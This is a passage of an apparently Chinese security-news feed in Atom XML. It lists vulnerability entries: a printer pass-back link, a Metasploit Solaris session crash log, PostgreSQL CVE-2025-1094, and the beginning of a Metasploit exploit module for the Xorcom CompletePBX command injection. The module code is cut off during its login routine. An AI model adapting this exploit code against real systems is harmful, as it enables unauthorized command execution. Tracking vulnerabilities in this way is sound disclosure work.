    <category term="CVE-2024:github search" scheme="http://example.com/tags/CVE-2024-github-search/"/>
    
    <category term="配置问题" scheme="http://example.com/tags/%E9%85%8D%E7%BD%AE%E9%97%AE%E9%A2%98/"/>
    
  </entry>
  
  <entry>
    <title>Konica Minolta bizhub Multifunction Printer Pass-Back Attack Vulnerability (NOT FIXED)</title>
    <link href="http://example.com/2025/06/30/blog_2506286812/"/>
    <id>http://example.com/2025/06/30/blog_2506286812/</id>
    <published>2025-06-30T16:00:08.531Z</published>
    <updated>2025-06-30T16:00:08.526Z</updated>
    
    <content type="html"><![CDATA[<p><strong>链接：</strong> <a href="https://www.rapid7.com/blog/post/cve-2025-6081-konica-minolta-bizhub-pass-back-attack-vulnerability-not-fixed/">https://www.rapid7.com/blog/post/cve-2025-6081-konica-minolta-bizhub-pass-back-attack-vulnerability-not-fixed/</a></p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;&lt;strong&gt;链接：&lt;/strong&gt; &lt;a href=&quot;https://www.rapid7.com/blog/post/cve-2025-6081-konica-minolta-bizhub-pass-back-attack-vulnerability-not-fix</summary>
      
    
    
    
    <category term="安全博客" scheme="http://example.com/categories/%E5%AE%89%E5%85%A8%E5%8D%9A%E5%AE%A2/"/>
    
    
    <category term="www.rapid7.com" scheme="http://example.com/tags/www-rapid7-com/"/>
    
  </entry>
  
  <entry>
    <title>Metasploit Framework Solaris 文件读取方法崩溃漏洞</title>
    <link href="http://example.com/2025/06/30/github_274689488/"/>
    <id>http://example.com/2025/06/30/github_274689488/</id>
    <published>2025-06-30T15:46:20.729Z</published>
    <updated>2025-06-30T15:46:20.726Z</updated>
    
    <content type="html"><![CDATA[<h1 id="漏洞信息"><a href="#漏洞信息" class="headerlink" title="漏洞信息"></a>漏洞信息</h1><p><strong>漏洞名称：</strong> Metasploit Framework Solaris 文件读取方法崩溃漏洞</p><p><strong>漏洞类型：</strong> 命令执行</p><p><strong>漏洞等级：</strong> 中危</p><p><strong>漏洞描述：</strong> 在Solaris系统上，使用Metasploit Framework的<code>readable?</code>、<code>exists?</code>或<code>read_file</code>方法时，会导致会话因EOFError而崩溃。此问题在Solaris 10u2上测试确认。</p><p><strong>产品厂商：</strong> Rapid7</p><p><strong>产品名称：</strong> Metasploit Framework</p><p><strong>来源：</strong> <a href="https://github.com/rapid7/metasploit-framework/issues/20103">https://github.com/rapid7/metasploit-framework/issues/20103</a></p><p><strong>类型：</strong> rapid7&#x2F;metasploit-framework:github issues</p><h1 id="来源概述"><a href="#来源概述" class="headerlink" title="来源概述"></a>来源概述</h1><ol><li>Get a <code>solaris/x86/shell_reverse_tcp</code> session on Solaris (tested on Solaris 10u2)</li><li>Run a module which reads a file, or create a module which uses <code>readable?</code> &#x2F; <code>exists?</code> &#x2F; <code>read_file</code></li></ol><figure class="highlight swift"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs swift">msf6 post(solaris<span class="hljs-regexp">/gather/</span>enum_packages) <span class="hljs-operator">&gt;</span> run<br>[<span class="hljs-operator">*</span>] <span class="hljs-number">192.168</span>.<span class="hljs-number">200.166</span> <span class="hljs-operator">-</span> <span class="hljs-type">Command</span> shell session <span class="hljs-number">3</span> closed.<br>[<span class="hljs-operator">-</span>] <span class="hljs-type">Post</span> failed: <span class="hljs-type">EOFError</span> <span class="hljs-type">EOFError</span><br>[<span class="hljs-operator">-</span>] <span class="hljs-type">Call</span> stack:<br>[<span class="hljs-operator">-</span>]   <span class="hljs-regexp">/var/</span>lib<span class="hljs-regexp">/gems/</span><span class="hljs-number">3.3</span>.<span class="hljs-number">0</span><span class="hljs-regexp">/gems/</span>rex<span class="hljs-operator">-</span>core<span class="hljs-operator">-</span><span class="hljs-number">0.1</span>.<span class="hljs-number">33</span><span class="hljs-regexp">/lib/</span>rex<span class="hljs-regexp">/io/</span>stream.rb:<span class="hljs-number">224</span>:<span class="hljs-keyword">in</span> `get_once&#x27;<br>[<span class="hljs-operator">-</span>]   <span class="hljs-regexp">/root/</span><span class="hljs-type">Desktop</span><span class="hljs-regexp">/metasploit-framework/</span>lib<span class="hljs-regexp">/msf/</span>base<span class="hljs-regexp">/sessions/</span>command_shell.rb:<span class="hljs-number">668</span>:<span class="hljs-keyword">in</span> `shell_read&#x27;<br>[<span class="hljs-operator">-</span>]   <span class="hljs-regexp">/root/</span><span class="hljs-type">Desktop</span><span class="hljs-regexp">/metasploit-framework/</span>lib<span class="hljs-regexp">/msf/</span>core<span class="hljs-regexp">/session/</span>provider<span class="hljs-operator">/</span>single_command_shell.rb:<span class="hljs-number">64</span>:<span class="hljs-keyword">in</span> `block (<span class="hljs-number">2</span> levels) <span class="hljs-keyword">in</span> shell_read_until_token&#x27;<br>[<span class="hljs-operator">-</span>]   <span class="hljs-operator">&lt;</span><span class="hljs-keyword">internal</span>:kernel<span class="hljs-operator">&gt;</span>:<span class="hljs-number">187</span>:<span class="hljs-keyword">in</span> `loop&#x27;<br>[<span class="hljs-operator">-</span>]   <span class="hljs-regexp">/root/</span><span class="hljs-type">Desktop</span><span class="hljs-regexp">/metasploit-framework/</span>lib<span class="hljs-regexp">/msf/</span>core<span class="hljs-regexp">/session/</span>provider<span class="hljs-operator">/</span>single_command_shell.rb:<span class="hljs-number">63</span>:<span class="hljs-keyword">in</span> `block <span class="hljs-keyword">in</span> shell_read_until_token&#x27;<br>[<span class="hljs-operator">-</span>]   <span class="hljs-regexp">/var/</span>lib<span class="hljs-regexp">/gems/</span><span class="hljs-number">3.3</span>.<span class="hljs-number">0</span><span class="hljs-regexp">/gems/</span>timeout<span class="hljs-operator">-</span><span class="hljs-number">0.4</span>.<span class="hljs-number">3</span><span class="hljs-regexp">/lib/</span>timeout.rb:<span class="hljs-number">185</span>:<span class="hljs-keyword">in</span> `block <span class="hljs-keyword">in</span> timeout&#x27;<br>[<span class="hljs-operator">-</span>]   <span class="hljs-regexp">/var/</span>lib<span class="hljs-regexp">/gems/</span><span class="hljs-number">3.3</span>.<span class="hljs-number">0</span><span class="hljs-regexp">/gems/</span>timeout<span class="hljs-operator">-</span><span class="hljs-number">0.4</span>.<span class="hljs-number">3</span><span class="hljs-regexp">/lib/</span>timeout.rb:<span class="hljs-number">38</span>:<span class="hljs-keyword">in</span> `handle_timeout&#x27;<br>[<span class="hljs-operator">-</span>]   <span class="hljs-regexp">/var/</span>lib<span class="hljs-regexp">/gems/</span><span class="hljs-number">3.3</span>.<span class="hljs-number">0</span><span class="hljs-regexp">/gems/</span>timeout<span class="hljs-operator">-</span><span class="hljs-number">0.4</span>.<span class="hljs-number">3</span><span class="hljs-regexp">/lib/</span>timeout.rb:<span class="hljs-number">194</span>:<span class="hljs-keyword">in</span> `timeout&#x27;<br>[<span class="hljs-operator">-</span>]   <span class="hljs-regexp">/root/</span><span class="hljs-type">Desktop</span><span class="hljs-regexp">/metasploit-framework/</span>lib<span class="hljs-regexp">/msf/</span>core<span class="hljs-regexp">/session/</span>provider<span class="hljs-operator">/</span>single_command_shell.rb:<span class="hljs-number">60</span>:<span class="hljs-keyword">in</span> `shell_read_until_token&#x27;<br>[<span class="hljs-operator">-</span>]   <span class="hljs-regexp">/root/</span><span class="hljs-type">Desktop</span><span class="hljs-regexp">/metasploit-framework/</span>lib<span class="hljs-regexp">/msf/</span>core<span class="hljs-regexp">/session/</span>provider<span class="hljs-operator">/</span>single_command_shell.rb:<span class="hljs-number">158</span>:<span class="hljs-keyword">in</span> `shell_command_token_base&#x27;<br>[<span class="hljs-operator">-</span>]   <span class="hljs-regexp">/root/</span><span class="hljs-type">Desktop</span><span class="hljs-regexp">/metasploit-framework/</span>lib<span class="hljs-regexp">/msf/</span>core<span class="hljs-regexp">/session/</span>provider<span class="hljs-operator">/</span>single_command_shell.rb:<span class="hljs-number">130</span>:<span class="hljs-keyword">in</span> `shell_command_token_unix&#x27;<br>[<span class="hljs-operator">-</span>]   <span class="hljs-regexp">/root/</span><span class="hljs-type">Desktop</span><span class="hljs-regexp">/metasploit-framework/</span>lib<span class="hljs-regexp">/msf/</span>base<span class="hljs-regexp">/sessions/</span>unix_escaping.rb:<span class="hljs-number">4</span>:<span class="hljs-keyword">in</span> `shell_command_token&#x27;<br>[<span class="hljs-operator">-</span>]   <span class="hljs-regexp">/root/</span><span class="hljs-type">Desktop</span><span class="hljs-regexp">/metasploit-framework/</span>lib<span class="hljs-regexp">/msf/</span>core<span class="hljs-regexp">/post/</span>common.rb:<span class="hljs-number">197</span>:<span class="hljs-keyword">in</span> `cmd_exec&#x27;<br>[<span class="hljs-operator">-</span>]   <span class="hljs-regexp">/root/</span><span class="hljs-type">Desktop</span><span class="hljs-regexp">/metasploit-framework/</span>lib<span class="hljs-regexp">/msf/</span>core<span class="hljs-regexp">/post/</span>file.rb:<span class="hljs-number">313</span>:<span class="hljs-keyword">in</span> `exist<span class="hljs-operator">?</span>&#x27;<br>[<span class="hljs-operator">-</span>]   <span class="hljs-regexp">/root/</span><span class="hljs-type">Desktop</span><span class="hljs-regexp">/metasploit-framework/</span>lib<span class="hljs-regexp">/msf/</span>core<span class="hljs-regexp">/post/</span>file.rb:<span class="hljs-number">279</span>:<span class="hljs-keyword">in</span> `readable<span class="hljs-operator">?</span>&#x27;<br>[<span class="hljs-operator">-</span>]   <span class="hljs-regexp">/root/</span><span class="hljs-type">Desktop</span><span class="hljs-regexp">/metasploit-framework/</span>lib<span class="hljs-regexp">/msf/</span>core<span class="hljs-regexp">/post/</span>file.rb:<span class="hljs-number">488</span>:<span class="hljs-keyword">in</span> `read_file&#x27;<br>[<span class="hljs-operator">-</span>]   <span class="hljs-regexp">/root/</span><span class="hljs-type">Desktop</span><span class="hljs-regexp">/metasploit-framework/</span>lib<span class="hljs-regexp">/msf/</span>core<span class="hljs-regexp">/post/</span>solaris<span class="hljs-operator">/</span>system.rb:<span class="hljs-number">17</span>:<span class="hljs-keyword">in</span> `get_sysinfo&#x27;<br>[<span class="hljs-operator">-</span>]   <span class="hljs-regexp">/root/</span><span class="hljs-type">Desktop</span><span class="hljs-regexp">/metasploit-framework/</span>modules<span class="hljs-regexp">/post/</span>solaris<span class="hljs-regexp">/gather/</span>enum_packages.rb:<span class="hljs-number">32</span>:<span class="hljs-keyword">in</span> `run&#x27;<br>[<span class="hljs-operator">*</span>] <span class="hljs-type">Post</span> module execution completed<br></code></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;漏洞信息&quot;&gt;&lt;a href=&quot;#漏洞信息&quot; class=&quot;headerlink&quot; title=&quot;漏洞信息&quot;&gt;&lt;/a&gt;漏洞信息&lt;/h1&gt;&lt;p&gt;&lt;strong&gt;漏洞名称：&lt;/strong&gt; Metasploit Framework Solaris 文件读取方法崩溃漏洞</summary>
      
    
    
    
    <category term="Github Poc" scheme="http://example.com/categories/Github-Poc/"/>
    
    
    <category term="命令执行" scheme="http://example.com/tags/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/"/>
    
    <category term="rapid7/metasploit-framework:github issues" scheme="http://example.com/tags/rapid7-metasploit-framework-github-issues/"/>
    
  </entry>
  
  <entry>
    <title>PostgreSQL libpq SQL注入漏洞</title>
    <link href="http://example.com/2025/06/30/github_4188654971/"/>
    <id>http://example.com/2025/06/30/github_4188654971/</id>
    <published>2025-06-30T15:46:08.528Z</published>
    <updated>2025-06-30T15:46:08.526Z</updated>
    
    <content type="html"><![CDATA[<h1 id="漏洞信息"><a href="#漏洞信息" class="headerlink" title="漏洞信息"></a>漏洞信息</h1><p><strong>漏洞名称：</strong> PostgreSQL libpq SQL注入漏洞</p><p><strong>漏洞编号：</strong></p><ul><li><strong>CVE：</strong> CVE-2025-1094</li></ul><p><strong>漏洞类型：</strong> SQL注入</p><p><strong>漏洞等级：</strong> 高危</p><p><strong>漏洞描述：</strong> PostgreSQL libpq中的函数PQescapeLiteral()、PQescapeIdentifier()、PQescapeString()和PQescapeStringConn()对引用语法的处理不当，允许数据库输入提供者在某些使用模式下实现SQL注入。具体来说，SQL注入要求应用程序使用函数结果构造psql（PostgreSQL交互式终端）的输入。类似地，PostgreSQL命令行实用程序中的引用语法处理不当，当client_encoding为BIG5且server_encoding为EUC_TW或MULE_INTERNAL时，允许命令行参数源实现SQL注入。PostgreSQL 17.3、16.7、15.11、14.16和13.19之前的版本受影响。</p><p><strong>产品厂商：</strong> PostgreSQL</p><p><strong>产品名称：</strong> PostgreSQL libpq</p><p><strong>影响版本：</strong> version &lt; 13.19, 14.16, 15.11, 16.7, 17.3</p><p><strong>来源：</strong> <a href="https://github.com/rapid7/metasploit-framework/issues/20363">https://github.com/rapid7/metasploit-framework/issues/20363</a></p><p><strong>类型：</strong> rapid7&#x2F;metasploit-framework:github issues</p><h1 id="来源概述"><a href="#来源概述" class="headerlink" title="来源概述"></a>来源概述</h1><h3 id="Summary"><a href="#Summary" class="headerlink" title="Summary"></a>Summary</h3><p>Improper neutralization of quoting syntax in PostgreSQL libpq functions PQescapeLiteral(), PQescapeIdentifier(), PQescapeString(), and PQescapeStringConn() allows a database input provider to achieve SQL injection in certain usage patterns. Specifically, SQL injection requires the application to use the function result to construct input to psql, the PostgreSQL interactive terminal. Similarly, improper neutralization of quoting syntax in PostgreSQL command line utility programs allows a source of command line arguments to achieve SQL injection when client_encoding is BIG5 and server_encoding is one of EUC_TW or MULE_INTERNAL. Versions before PostgreSQL 17.3, 16.7, 15.11, 14.16, and 13.19 are affected.<br>[Summary was taken from <a href="https://nvd.nist.gov/vuln/detail/cve-2025-1094">NVD</a>]</p><p>References</p><ul><li><a href="https://nvd.nist.gov/vuln/detail/cve-2025-1094">https://nvd.nist.gov/vuln/detail/cve-2025-1094</a></li><li><a href="https://access.redhat.com/security/cve/cve-2025-1094">https://access.redhat.com/security/cve/cve-2025-1094</a></li><li><a href="https://www.rapid7.com/blog/post/2025/02/13/cve-2025-1094-postgresql-psql-sql-injection-fixed/">https://www.rapid7.com/blog/post/2025/02/13/cve-2025-1094-postgresql-psql-sql-injection-fixed/</a></li></ul>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;漏洞信息&quot;&gt;&lt;a href=&quot;#漏洞信息&quot; class=&quot;headerlink&quot; title=&quot;漏洞信息&quot;&gt;&lt;/a&gt;漏洞信息&lt;/h1&gt;&lt;p&gt;&lt;strong&gt;漏洞名称：&lt;/strong&gt; PostgreSQL libpq SQL注入漏洞&lt;/p&gt;
&lt;p&gt;&lt;strong</summary>
      
    
    
    
    <category term="Github Poc" scheme="http://example.com/categories/Github-Poc/"/>
    
    
    <category term="SQL注入" scheme="http://example.com/tags/SQL%E6%B3%A8%E5%85%A5/"/>
    
    <category term="rapid7/metasploit-framework:github issues" scheme="http://example.com/tags/rapid7-metasploit-framework-github-issues/"/>
    
  </entry>
  
  <entry>
    <title>Xorcom CompletePBX Authenticated Command Injection via Task Scheduler</title>
    <link href="http://example.com/2025/06/30/github_174279459/"/>
    <id>http://example.com/2025/06/30/github_174279459/</id>
    <published>2025-06-30T15:45:46.583Z</published>
    <updated>2025-06-30T15:45:46.577Z</updated>
    
    <content type="html"><![CDATA[<h1 id="漏洞信息"><a href="#漏洞信息" class="headerlink" title="漏洞信息"></a>漏洞信息</h1><p><strong>漏洞名称：</strong> Xorcom CompletePBX Authenticated Command Injection via Task Scheduler</p><p><strong>漏洞编号：</strong></p><ul><li><strong>CVE：</strong> 2025-30004</li></ul><p><strong>漏洞类型：</strong> 命令执行</p><p><strong>漏洞等级：</strong> 高危</p><p><strong>漏洞描述：</strong> Xorcom CompletePBX 5.2.35及更早版本中存在一个通过任务调度功能实现的认证命令注入漏洞。该漏洞允许具有超级管理员权限的用户（admin）利用任务调度功能中的用户输入不当清理问题，以Web服务器权限执行任意命令。即使创建具有最大权限的新用户，该漏洞也无法被利用。</p><p><strong>产品厂商：</strong> Xorcom</p><p><strong>产品名称：</strong> CompletePBX</p><p><strong>影响版本：</strong> &lt;&#x3D; 5.2.35</p><p><strong>来源：</strong> <a href="https://github.com/rapid7/metasploit-framework/blob/d0aaf70bbb8bce242885e82d201a0bc707a89b58/modules%2Fexploits%2Flinux%2Fhttp%2Fxorcom_completepbx_scheduler.rb">https://github.com/rapid7/metasploit-framework/blob/d0aaf70bbb8bce242885e82d201a0bc707a89b58/modules%2Fexploits%2Flinux%2Fhttp%2Fxorcom_completepbx_scheduler.rb</a></p><p><strong>类型：</strong> rapid7&#x2F;metasploit-framework:github issues</p><h1 id="POC详情"><a href="#POC详情" class="headerlink" title="POC详情"></a>POC详情</h1><figure class="highlight livescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br></pre></td><td class="code"><pre><code class="hljs livescript"><br><span class="hljs-comment">##</span><br><span class="hljs-comment"># This module requires Metasploit: https://metasploit.com/download</span><br><span class="hljs-comment"># Current source: https://github.com/rapid7/metasploit-framework</span><br><span class="hljs-comment">##</span><br><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">MetasploitModule</span> &lt; Msf::Exploit::Remote<br>  Rank = ExcellentRanking<br><br>  include Msf::Exploit::Remote::HttpClient<br>  prepend Msf::Exploit::Remote::AutoCheck<br><br>  def initialize(info = &#123;&#125;)<br>    super(<br>      update_info(<br>        info,<br>        <span class="hljs-string">&#x27;Name&#x27;</span> =&gt; <span class="hljs-string">&#x27;Xorcom CompletePBX Authenticated Command Injection via Task Scheduler&#x27;</span>,<br>        <span class="hljs-string">&#x27;Description&#x27;</span> =&gt; %q&#123;<br>          This module exploits an authenticated command injection vulnerability <span class="hljs-keyword">in</span> Xorcom CompletePBX<br>          versions &lt;= <span class="hljs-number">5.2</span>.<span class="hljs-number">35.</span> The issue resides <span class="hljs-keyword">in</span> the task scheduler functionality, where user-controlled<br>          input <span class="hljs-keyword">is</span> improperly sanitized, allowing arbitrary command execution <span class="hljs-keyword">with</span> web server privileges.<br><br>          Only the **superadmin** user (`admin`) has the necessary permissions <span class="hljs-keyword">to</span> trigger this exploit.<br>          Even <span class="hljs-keyword">when</span> creating a <span class="hljs-keyword">new</span> user <span class="hljs-keyword">with</span> maximum privileges, the vulnerability does <span class="hljs-keyword">not</span> work.<br>        &#125;,<br>        <span class="hljs-string">&#x27;Author&#x27;</span> =&gt; [<br>          <span class="hljs-string">&#x27;Valentin Lobstein&#x27;</span> <span class="hljs-comment"># Research and module development</span><br>        ],<br>        <span class="hljs-string">&#x27;License&#x27;</span> =&gt; MSF_LICENSE,<br>        <span class="hljs-string">&#x27;References&#x27;</span> =&gt; [<br>          [<span class="hljs-string">&#x27;CVE&#x27;</span>, <span class="hljs-string">&#x27;2025-30004&#x27;</span>],<br>          [<span class="hljs-string">&#x27;URL&#x27;</span>, <span class="hljs-string">&#x27;https://www.xorcom.com/products/completepbx/&#x27;</span>],<br>          [<span class="hljs-string">&#x27;URL&#x27;</span>, <span class="hljs-string">&#x27;https://chocapikk.com/posts/2025/completepbx/&#x27;</span>]<br>        ],<br>        <span class="hljs-string">&#x27;Privileged&#x27;</span> =&gt; <span class="hljs-literal">false</span>,<br>        <span class="hljs-string">&#x27;Platform&#x27;</span> =&gt; %w[unix linux],<br>        <span class="hljs-string">&#x27;Arch&#x27;</span> =&gt; [ARCH_CMD],<br>        <span class="hljs-string">&#x27;Targets&#x27;</span> =&gt; [<br>          [<br>            <span class="hljs-string">&#x27;Unix/Linux Command Shell&#x27;</span>,<br>            &#123;<br>              <span class="hljs-string">&#x27;Platform&#x27;</span> =&gt; %w[unix linux],<br>              <span class="hljs-string">&#x27;Arch&#x27;</span> =&gt; ARCH_CMD<br>            &#125;<br>          ]<br>        ],<br>        <span class="hljs-string">&#x27;DefaultTarget&#x27;</span> =&gt; <span class="hljs-number">0</span>,<br>        <span class="hljs-string">&#x27;DisclosureDate&#x27;</span> =&gt; <span class="hljs-string">&#x27;2025-03-02&#x27;</span>,<br>        <span class="hljs-string">&#x27;Notes&#x27;</span> =&gt; &#123;<br>          <span class="hljs-string">&#x27;Stability&#x27;</span> =&gt; [CRASH_SAFE],<br>          <span class="hljs-string">&#x27;Reliability&#x27;</span> =&gt; [REPEATABLE_SESSION],<br>          <span class="hljs-string">&#x27;SideEffects&#x27;</span> =&gt; [IOC_IN_LOGS]<br>        &#125;<br>      )<br>    )<br><br>    register_options([<br>      OptString.<span class="hljs-keyword">new</span>(<span class="hljs-string">&#x27;USERNAME&#x27;</span>, [<span class="hljs-literal">true</span>, <span class="hljs-string">&#x27;Valid CompletePBX username&#x27;</span>]),<br>      OptString.<span class="hljs-keyword">new</span>(<span class="hljs-string">&#x27;PASSWORD&#x27;</span>, [<span class="hljs-literal">true</span>, <span class="hljs-string">&#x27;Valid CompletePBX password&#x27;</span>]),<br>    ])<br>  end<br><br>  def check<br>    print_status(<span class="hljs-string">&#x27;Checking if the target is running CompletePBX...&#x27;</span>)<br><br>    res = send_request_cgi(&#123;<br>      <span class="hljs-string">&#x27;uri&#x27;</span> =&gt; normalize_uri(target_uri.path),<br>      <span class="hljs-string">&#x27;method&#x27;</span> =&gt; <span class="hljs-string">&#x27;GET&#x27;</span><br>    &#125;)<br><br>    <span class="hljs-keyword">return</span> Exploit::CheckCode::Unknown(<span class="hljs-string">&#x27;No response from target.&#x27;</span>) <span class="hljs-keyword">unless</span> res<br>    <span class="hljs-keyword">return</span> Exploit::CheckCode::Unknown(<span class="hljs-string">&quot;Unexpected HTTP response code: <span class="hljs-subst">#&#123;res.code&#125;</span>&quot;</span>) <span class="hljs-keyword">unless</span> res.code == <span class="hljs-number">200</span><br><br>    doc = res.get_html_document<br><br>    <span class="hljs-keyword">if</span> doc.at(<span class="hljs-string">&#x27;//meta[@name=&quot;description&quot;][@content=&quot;CompletePBX&quot;]&#x27;</span>) ||<br>       doc.at(<span class="hljs-string">&#x27;//meta[@name=&quot;application-name&quot;][@content=&quot;Ombutel&quot;]&#x27;</span>)<br><br>      print_good(<span class="hljs-string">&quot;Detected CompletePBX on <span class="hljs-subst">#&#123;peer&#125;</span>&quot;</span>)<br>      <span class="hljs-keyword">return</span> Exploit::CheckCode::Appears<br>    end<br><br>    <span class="hljs-keyword">return</span> Exploit::CheckCode::Safe(<span class="hljs-string">&#x27;Target does not appear to be running CompletePBX.&#x27;</span>)<br>  end<br><br>  def login<br>    print_status(<span class="hljs-string">&quot;Attempting authentication with username: <span class="hljs-subst">#&#123;datastore[<span class="hljs-string">&#x27;USERNAME&#x27;</span>]&#125;</span>&quot;</span>)<br><br>    res = send_request_cgi(&#123;<br>      <span class="hljs-string">&#x27;uri&#x27;</span> =&gt; normalize_uri(target_uri.path, <span class="hljs-string">&#x27;login&#x27;</span>),<br>      <span class="hljs-string">&#x27;method&#x27;</span> =&gt; <span class="hljs-string">&#x27;POST&#x27;</span>,<br>      <span class="hljs-string">&#x27;ctype&#x27;</span> =&gt; <span class="hljs-string">&#x27;application/x-www-form-urlencoded&#x27;</span>,<br>      <span class="hljs-string">&#x27;vars_post&#x27;</span> =&gt; &#123;<br>        <span class="hljs-string">&#x27;userid&#x27;</span> =&gt; datastore[<span class="hljs-string">&#x27;USERNAME&#x27;</span>],<br>        <span class="hljs-string">&#x27;userpass&#x27;</span> =&gt; datastore[<span class="hljs-string">&#x27;PASSWORD&#x27;</span>]<br>      &#125;<br>    &#125;)<br><br>    <span class="hljs-keyword">unless</span> res<br>      fail_with(Failure::Unreachable, <span class="hljs-string">&#x27;No response from target&#x27;</span>)<br>    end<br><br>    <span class="hljs-keyword">unless</span> res.code == <span class="hljs-number">200</span><br>      fail_with(Failure::UnexpectedReply, <span class="hljs-string">&quot;Unexpected HTTP response code: <span class="hljs-subst">#&#123;res.code&#125;</span>&quot;</span>)<br>    end<br><br>    sid_cookie = res.get_cookies.scan(<span class="hljs-regexp">/sid=[a-f0-9]+/</span>).first<br><br>    <span class="hljs-keyword">unless</span> sid_cookie<br>      fail_with(Failure::NoAccess, <span class="hljs-string">&#x27;Authentication failed: No session ID 